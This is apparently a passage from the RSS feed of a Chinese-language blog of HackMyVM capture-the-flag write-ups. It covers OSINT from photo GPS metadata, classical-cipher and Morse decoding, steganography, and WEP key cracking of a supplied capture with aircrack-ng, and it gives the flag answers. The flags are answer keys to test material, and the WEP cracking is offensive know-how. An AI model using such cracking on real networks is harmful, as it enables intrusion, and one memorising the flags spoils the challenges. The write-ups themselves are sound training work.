Image Size                      : 5520x4140
Megapixels                      : 22.9
Shutter Speed                   : 1/2000
Create Date                     : 2016:07:25 20:44:46.461942
Date/Time Original              : 2016:07:25 20:44:46.461942
Modify Date                     : 2016:07:25 20:44:46.461942
Thumbnail Image                 : (Binary data 3982 bytes, use -b option to extract)
GPS Altitude                    : 25 m Above Sea Level
GPS Date/Time                   : 2016:07:25 18:44:29Z
GPS Latitude                    : 58 deg 58' 2.87' N
GPS Longitude                   : 18 deg 18' 59.03' E
Focal Length                    : 4.2 mm
GPS Position                    : 58 deg 58' 2.87' N, 18 deg 18' 59.03' E
Light Value                     : 14.3
                      
```

![osint](https://7r1umphk.github.io/image/20250614110003767.webp)

有GPS信息！

将经纬度转换成十进制

https://www.sunearthtools.com/dp/tools/conversion.php?lang=cn

![image-20250614111103736](https://7r1umphk.github.io/image/20250614111103977.webp)

然后我去试不行

后面我尝试添加一点减少一点才成功

正确的是

```
HMV{58.967463,18.316396}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20037.html</guid><pubDate>Fri, 27 Jun 2025 09:31:23 +0000</pubDate></item><item><title>Challenge 035</title><link>https://7r1UMPHK.github.io/post/Challenge%20035.html</link><description>![image-20250613233326180](https://7r1umphk.github.io/image/20250613233326526.webp)

```
Help us to decrypt this message: 'Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6!' Unfortunately we only have one clear text message: 'Hi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!'


翻译：
帮助我们解密这条消息：“Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6！” 很遗憾，我们只有一条明文消息：“嗨，约翰。我是管理团队的。我们刚刚收到您更改密码的请求，几分钟后就会回复您。非常感谢您联系我们，希望您的问题已经得到解决！”
```

看着不像简单的凯撒

```
Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6！
Hi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!
```

替换密码，多表替换......试试维吉尼亚吧

https://www.dcode.fr/vigenere-cipher

![image-20250614002540728](https://7r1umphk.github.io/image/20250614002540927.webp)

看看

![image-20250614002725142](https://7r1umphk.github.io/image/20250614002725459.webp)

继续看

![image-20250614002746485](https://7r1umphk.github.io/image/20250614002746748.webp)

先确定字符集

实现密文包含**大写字母和数字**，例如 Hx、92gm、C6lnp

这说明它使用的不是标准的26个字母，而是一个**自定义的扩展Alphabet**

所以它有可能是

ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890

0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ

1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ

然后你就可以丢去给ai了，问它哪个比较可能，让他算密钥流

```
我有一个维吉纳密码的变体，它在加密时不区分大小写（所有字母都按大写处理）。
我现在需要你通过计算来判断，下面的四个字符集中，哪一个才是正确的？
候选字符集:
ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ
已知信息：
密文片段: Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf
明文片段: Hi John. I am from the Administrative team
```

(AI算这个玩意很容易幻听，建议最好自己验证一遍)

![image-20250614094651088](https://7r1umphk.github.io/image/20250614094651302.webp)

算出的密钥流是1F9S3SZ63TAS，它完美重复了

![image-20250614094821115](https://7r1umphk.github.io/image/20250614094821350.webp)

```
HMV{h0w_d0_y0u_g37_th15}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20035.html</guid><pubDate>Fri, 27 Jun 2025 09:31:21 +0000</pubDate></item><item><title>Challenge 034</title><link>https://7r1UMPHK.github.io/post/Challenge%20034.html</link><description>![image-20250613232956875](https://7r1umphk.github.io/image/20250613232957326.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 034.zip 
-rwxr-xr-x 1 kali kali 3210 Jun 13 11:30 034.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 034.zip 
Archive:  034.zip
  inflating: 034.jpg                 
              
```

看看

![034](https://7r1umphk.github.io/image/20250613233047100.webp)

google识图

![image-20250613233203766](https://7r1umphk.github.io/image/20250613233204073.webp)

```
HMV{Somalia}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20034.html</guid><pubDate>Fri, 27 Jun 2025 09:31:18 +0000</pubDate></item><item><title>Challenge 033</title><link>https://7r1UMPHK.github.io/post/Challenge%20033.html</link><description>![image-20250613223248138](https://7r1umphk.github.io/image/202506132232437.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 033.zip 
-rwxr-xr-x 1 kali kali 1538000 Jun 13 10:33 033.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 033.zip 
Archive:  033.zip
  inflating: 033.pcap                
                    
```

提示是wep密钥了，所以直接爆破

```
aircrack-ng 033.pcap
                                                                                Aircrack-ng 1.7 


                                                                  [00:00:00] Tested 60016 keys (got 17273 IVs)

   KB    depth   byte(vote)
    0    0/  1   4D(28160) 24(23808) 58(23552) 44(22528) B7(22528) 94(21760) D2(21504) 00(20992) 39(20992) 71(20992) CE(20992) 0B(20736) 1E(20736) 4A(20736) 
    1    4/ 34   59(21760) E1(21504) 5B(21504) B0(20992) 56(20736) 98(20736) A6(20736) B4(20480) EF(20480) 86(20480) B1(20480) EA(20224) FD(20224) 10(20224) 
    2   36/ 45   04(19712) 16(19456) 41(19456) 56(19456) 7B(19456) 7C(19456) 81(19456) E6(19456) F1(19456) F2(19456) 8A(19200) B2(19200) E3(19200) 8F(18944) 
    3   14/ 40   45(20992) D3(20992) 94(20736) 04(20736) 0F(20480) 58(20480) B2(20480) 00(20480) 1E(20224) 20(20224) 31(20224) 57(20224) A1(20224) CB(20224) 
    4    0/  1   59(27648) 6F(23040) 25(22016) 20(21760) 38(21760) 30(21504) 53(21504) 67(21504) 84(21504) DB(21504) E7(21504) 08(20992) B8(20736) BE(20736) 

                     KEY FOUND! [ 4D:59:4B:45:59 ] (ASCII: MYKEY )
        Decrypted correctly: 100%

```

所以flag

```
HMV{MYKEY}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20033.html</guid><pubDate>Fri, 27 Jun 2025 09:31:16 +0000</pubDate></item><item><title>Challenge 032</title><link>https://7r1UMPHK.github.io/post/Challenge%20032.html</link><description>![image-20250613222805234](https://7r1umphk.github.io/image/202506132228210.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 032.zip   
-rwxr-xr-x 1 kali kali 5929 Jun 13 10:28 032.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 032.zip 
Archive:  032.zip
  inflating: 032.gif                 
           
```

看看

![032](https://7r1umphk.github.io/image/202506132229342.webp)

隔着循环播放呢

https://www.pdfpai.com/gif-to-png

扒拉一下静态照片，然后拼一下flag

```
HMV{gifarefun}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20032.html</guid><pubDate>Fri, 27 Jun 2025 09:31:13 +0000</pubDate></item><item><title>Challenge 031</title><link>https://7r1UMPHK.github.io/post/Challenge%20031.html</link><description>![1111](https://7r1umphk.github.io/image/202506132211238.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 030.zip 
-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 030.zip 
Archive:  030.zip
  inflating: 030.png                 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 031.zip 
-rwxr-xr-x 1 kali kali 973 Jun 13 10:11 031.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 031.zip 
Archive:  031.zip
  inflating: 031.wav                 
              
```

听一下，ok又是摩斯密码

https://morsecode.world/international/decoder/audio-decoder-adaptive.html

![image-20250613222739128](https://7r1umphk.github.io/image/202506132227527.webp)

```
HMV{MORSEGIVESYOUTHEFLAG}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20031.html</guid><pubDate>Fri, 27 Jun 2025 09:31:11 +0000</pubDate></item><item><title>Challenge 030</title><link>https://7r1UMPHK.github.io/post/Challenge%20030.html</link><description>![image-20250613220818347](https://7r1umphk.github.io/image/202506132208605.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 030.zip 
-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 030.zip 
Archive:  030.zip
  inflating: 030.png                 
                          
```

看看

![030](https://7r1umphk.github.io/image/202506132208685.webp)

扒拉一个ps，编辑了一下

https://ps.gaoding.com/

自己改一下

![image-20250613220903507](https://7r1umphk.github.io/image/202506132209658.webp)

https://cli.im/deqr/other

解码
![image-20250613220934058](https://7r1umphk.github.io/image/202506132209311.webp)

```
HMV{qrsospecial}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20030.html</guid><pubDate>Fri, 27 Jun 2025 09:31:08 +0000</pubDate></item><item><title>Challenge 029</title><link>https://7r1UMPHK.github.io/post/Challenge%20029.html</link><description>![image-20250612210313007](https://7r1umphk.github.io/image/202506122103342.webp)

子域名

https://zh.subdomains.whoisxmlapi.com/lookup

![image-20250613213543362](https://7r1umphk.github.io/image/202506132135949.webp)

```
HMV{publicd0main}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20029.html</guid><pubDate>Fri, 27 Jun 2025 09:31:06 +0000</pubDate></item><item><title>Challenge 028</title><link>https://7r1UMPHK.github.io/post/Challenge%20028.html</link><description>![](https://7r1umphk.github.io/image/202506121923186.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 028.zip
-rwxr-xr-x 1 kali kali 1967 Jun 12 07:23 028.zip
             
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 028.zip 
Archive:  028.zip
  inflating: 028.wav                 
                                           
```

听了一下，是摩斯密码

找工具

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ git clone https://github.com/Ling-Ink/MorseAudioDecoder.git
Cloning into 'MorseAudioDecoder'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 28 (delta 5), reused 27 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 606.49 KiB | 416.00 KiB/s, done.
Resolving deltas: 100% (5/5), done.
                                                                                         
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd MorseAudioDecoder 
                                                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx/MorseAudioDecoder]
└─$ python3 main.py ../028.wav 
_wave_params(nchannels=1, sampwidth=1, framerate=8000, nframes=345520, comptype='NONE', compname='not compressed')
wave avg: 24500
Drawing Morse Image: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████| 172760/172760 [00:00&lt;00:00, 3670573.72it/s]
morse block avg: 7.958333333333333
morse blank avg: 4.034722222222222
Morse Result: -/-/-/--/----/-/--/-----/-/-----/--/-/-/--/----/-/-/---/-/--/-/---/----/-/--/-/-/-/--/-/-/--/--/--/-/----/---/-/--/-/----/-/---/--/--/-/---/--/--/-/--/-/-/---/-/----/-/--/-/--/-/-/-/--/-/---/----/-/---/--/--/-/---/--.
Traceback (most recent call last):
  File '/mnt/hgfs/gx/MorseAudioDecoder/main.py', line 120, in &lt;module&gt;
    plain_text += morse_dict[morse]
                  ~~~~~~~~~~^^^^^^^
KeyError: '----'
                                          
```

寄

去其他地方扒拉一下

https://morsecode.world/international/decoder/audio-decoder-adaptive.html

我快滴滴答傻了

![image-20250612210103780](https://7r1umphk.github.io/image/202506122101105.webp)

```
ETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE
```

解密

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat tmp.txt                                
ETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat tmp.txt | sed 's/E/0/g' | sed 's/T/1/g'
011101000110100001100001011101000111001101100100011011110111010101100010011011000110010101100101011011100110001101101111011001000110010101100100
```

![image-20250612210203140](https://7r1umphk.github.io/image/202506122102548.webp)

```
HMV{thatsdoubleencoded}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20028.html</guid><pubDate>Fri, 27 Jun 2025 09:31:03 +0000</pubDate></item><item><title>Challenge 027</title><link>https://7r1UMPHK.github.io/post/Challenge%20027.html</link><description>![image-20250612192123140](https://7r1umphk.github.io/image/202506121921452.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/t0r1k34s3/ 
Where is my flag?                                                                                                                                                                                 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/t0r1k34s3/                          
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 12 Jun 2025 11:22:06 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Flag: HMV{flaginmyheader}

Where is my flag?                                                                                                                                                                                   
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20027.html</guid><pubDate>Fri, 27 Jun 2025 09:30:58 +0000</pubDate></item><item><title>Challenge 026</title><link>https://7r1UMPHK.github.io/post/Challenge%20026.html</link><description>![image-20250612191601943](https://7r1umphk.github.io/image/202506121916254.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 026.zip 
-rwxr-xr-x 1 kali kali 160499 Jun 12 07:16 026.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 026.zip 
Archive:  026.zip
  inflating: 026.jpg                 
                       
```

![026](https://7r1umphk.github.io/image/202506121916188.webp)

右上角

![image-20250612191725946](https://7r1umphk.github.io/image/202506121917179.webp)

![image-20250612191917698](https://7r1umphk.github.io/image/202506121919934.webp)

```
HMV{Turkey}
```

应该是这个英语，自己试试sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20026.html</guid><pubDate>Fri, 27 Jun 2025 09:30:56 +0000</pubDate></item><item><title>Challenge 025</title><link>https://7r1UMPHK.github.io/post/Challenge%20025.html</link><description>![image-20250612191237073](https://7r1umphk.github.io/image/202506121912373.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 025.zip 
-rwxr-xr-x 1 kali kali 1495709 Jun 12 07:12 025.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 025.zip 
Archive:  025.zip
  inflating: 025.png                 
                         
```

![025](https://7r1umphk.github.io/image/202506121913972.webp)

![image-20250612191418119](https://7r1umphk.github.io/image/202506121914522.webp)

放大

![image-20250612191435611](https://7r1umphk.github.io/image/202506121914807.webp)

```
HMV{whattimeisit}
```

如果不对，直接对照一下sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20025.html</guid><pubDate>Fri, 27 Jun 2025 09:30:53 +0000</pubDate></item><item><title>Challenge 024</title><link>https://7r1UMPHK.github.io/post/Challenge%20024.html</link><description>![image-20250612190956179](https://7r1umphk.github.io/image/202506121909489.webp)

拿个浏览器，访问这个网页，你会发现flag一闪而过

拿个burp抓就好了

![image-20250612191151691](https://7r1umphk.github.io/image/202506121911882.webp)

```
HMV{fastredirect}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20024.html</guid><pubDate>Fri, 27 Jun 2025 09:30:51 +0000</pubDate></item><item><title>Challenge 016</title><link>https://7r1UMPHK.github.io/post/Challenge%20016.html</link><description>![image-20250612182407919](https://7r1umphk.github.io/image/202506121824441.webp)

```
HMV{\033[31mw\033[31mh\033[31my\033[31m i\033[31mm \033[31mn\033[31mo\033[31mt \033[39m m\033[39ma\033[39my\033[39mb\033[39me \033[39mu\033[39ms\033[39me \033[32m g\033[32mr\033[32me\033[32me\033[32mn\033[32mt\033[32mh\033[32me\033[32mf\033[32ml\033[32ma\033[32mg\033[39m}
```

终端颜色混淆伪装

```
why im not maybe use green the flag
```

绿色

```
HMV{greentheflag}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20016.html</guid><pubDate>Fri, 27 Jun 2025 09:30:48 +0000</pubDate></item><item><title>Challenge 048</title><link>https://7r1UMPHK.github.io/post/Challenge%20048.html</link><description>![image-20250621125632465](https://7r1umphk.github.io/image/20250621125632761.webp)

下载，解压

![48](https://7r1umphk.github.io/image/20250621125716382.webp)

一个类似于车牌

google一下

![image-20250621125830400](https://7r1umphk.github.io/image/20250621125830567.webp)

乌克兰

前两位字母表示**注册地的区域代码**

AA 是基辅

```
HMV{kyiv}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20048.html</guid><pubDate>Fri, 27 Jun 2025 09:30:45 +0000</pubDate></item><item><title>Challenge 047</title><link>https://7r1UMPHK.github.io/post/Challenge%20047.html</link><description>![image-20250621124138454](https://7r1umphk.github.io/image/20250621124138743.webp)

```
&lt;pre&gt; magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40] Hint: Use python code for decoding the magic_num_list... &lt;/pre&gt;
```

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 47.zip 
Archive:  47.zip
  inflating: 47.py                   
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 47.       
cat: 47.: No such file or directory
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 47.py 
import string

def magic_encode(flag):
    flag, magic_num_list = divmod(flag, 61)
    return f'{string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase}' [magic_num_list]                                                                                               
```

61 进制映射

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 47p.py 
import string

base61_table = string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase
magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]

decoded = ''.join(base61_table[i] for i in magic_num_list)
print(decoded)

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ python3 $_
DibmMfOhFtBsFbXfTpNf
  
```

但是我拿去交，错的

那就有一种可能了，编码表的顺序可能有问题

我们直接爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 47p.py
import string

magic_num_list = [12, 43, 36, 47, 21, 40, 23, 42, 14, 54, 10, 53, 14, 36, 32, 40, 28, 50, 22, 40]

tables = {
    'digits[1:] + uppercase + lowercase': string.digits[1:] + string.ascii_uppercase + string.ascii_lowercase,
    'digits + lowercase + uppercase': string.digits + string.ascii_lowercase + string.ascii_uppercase,
    'digits + uppercase + lowercase': string.digits + string.ascii_uppercase + string.ascii_lowercase,
    'uppercase + lowercase + digits': string.ascii_uppercase + string.ascii_lowercase + string.digits,
}

for name, table in tables.items():
    try:
        decoded = ''.join(table[i] for i in magic_num_list)
        print(f'{name} --&gt; {decoded}')
    except IndexError:
        print(f'{name} --&gt; IndexError: 表长度不足')

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ python3 $_
digits[1:] + uppercase + lowercase --&gt; DibmMfOhFtBsFbXfTpNf
digits + lowercase + uppercase --&gt; cHALlEnGeSaReAwEsOmE
digits + uppercase + lowercase --&gt; ChalLeNgEsArEaWeSoMe
uppercase + lowercase + digits --&gt; MrkvVoXqO2K1OkgocyWo
                                                 
```

一个个试

这个是对的cHALlEnGeSaReAwEsOmE

```
HMV{cHALlEnGeSaReAwEsOmE}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20047.html</guid><pubDate>Fri, 27 Jun 2025 09:30:41 +0000</pubDate></item><item><title>Challenge 046</title><link>https://7r1UMPHK.github.io/post/Challenge%20046.html</link><description>暂时没事干，刷一下挑战

![image-20250621073717593](https://7r1umphk.github.io/image/20250621073717886.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 046.zip         
Archive:  046.zip
  inflating: 046.txt                 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat -A 046.txt 
x=W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm;y=FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=;x+y^M$
^M$
^M$
^M$
^M$
```

目测是base64

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cm' | wc -c
130
          
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo -n 'FtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | wc -c                            
102
 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo -n 'W0oyRmlZMlJsWm1kb2FXcHJiRzF1YjNCeGNuTjBkWFozZUhsNlFVSkRSRVZHUjBoSlNrdE1UVTVQVUZGU1UxUlZWbGRZV1ZvbklDZDZlWGgzZG5WMGMzSnhjRzl1Yld4cmFtbG9aMlpsWkdOaVlWcFpXRmRXVlZSVFVsRlFUMDVOVEV0S1NVaEhSa1ZFUTBKQkp3bz0sIEhWMUR2M1FvQjNFYngyb2V5bTBQXQo=' | base64 -d
[J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=, HV1Dv3QoB3Ebx2oeym0P]
  
```

J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=

HV1Dv3QoB3Ebx2oeym0P

先解第一段

```然后有点抽象
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo -n 'J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonICd6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYVpZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBJwo=' | base64 -d 
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' 'zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA'
```

这明显是一个 **字符映射表**，也就是用于 **简单替换加密**的

左边是明文字符集（小写+大写）：

```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
```

右边是对应的密文字符映射（即：倒序）：

```
zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA
```

换句话说，这是一个 **Atbash Cipher**

那你可以直接拿去CyberChef了

![image-20250621123721248](https://7r1umphk.github.io/image/20250621123721628.webp)

这样就出flag了

```
HMV{recursion}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20046.html</guid><pubDate>Fri, 27 Jun 2025 09:30:38 +0000</pubDate></item><item><title>Challenge 045</title><link>https://7r1UMPHK.github.io/post/Challenge%20045.html</link><description>![image-20250617122237188](https://7r1umphk.github.io/image/20250617122237544.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 045.zip                     
-rwxr-xr-x 1 kali kali 83848 Jun 17 00:22 045.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 045.zip 
Archive:  045.zip
  inflating: image.png               
     
```

![image](https://7r1umphk.github.io/image/20250617122346695.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 045.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 83848 bytes (82 KiB)

Extracting archive: 045.zip
--
Path = 045.zip
Type = zip
Physical Size = 83848

    
Would you like to replace the existing file:
  Path:     ./image.png
  Size:     79263 bytes (78 KiB)
  Modified: 2023-12-15 11:59:40
with the file from archive:
  Path:     image.png
  Size:     79263 bytes (78 KiB)
  Modified: 2023-12-15 11:59:39
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

Everything is Ok

Size:       79263
Compressed: 83848
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file 045.zip                                                                                                        
045.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Dec 15 2023 10:59:40, uncompressed size 79263, method=deflate
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file image.png  
image.png: PNG image data, 304 x 481, 8-bit/color RGBA, non-interlaced
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ exiftool image.png 
ExifTool Version Number         : 13.25
File Name                       : image.png
Directory                       : .
File Size                       : 79 kB
File Modification Date/Time     : 2023:12:15 10:59:39-05:00
File Access Date/Time           : 2025:06:17 00:24:11-04:00
File Inode Change Date/Time     : 2023:12:15 10:59:39-05:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 304
Image Height                    : 481
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Image Size                      : 304x481
Megapixels                      : 0.146
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ stegseek image.png 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file 'image.png' is not supported.
                                   
```

strings瞄了一下

并且拿binwalk验证一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ binwalk 045.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png
79108         0x13504         PNG image, 400 x 300, 8-bit/color RGBA, non-interlaced
79644         0x1371C         Zlib compressed data, best compression
83826         0x14772         End of Zip archive, footer length: 22

           
```

它塞了点东西

试了一下binwalk不行
```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ binwalk --extract 045.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png
79644         0x1371C         Zlib compressed data, best compression

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd _045.zip.extracted 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/_045.zip.extracted]
└─$ ls -al
total 650
drwxr-xr-x 1 kali kali      0 Jun 17 00:44 .
drwxr-xr-x 1 kali kali  16384 Jun 17 00:44 ..
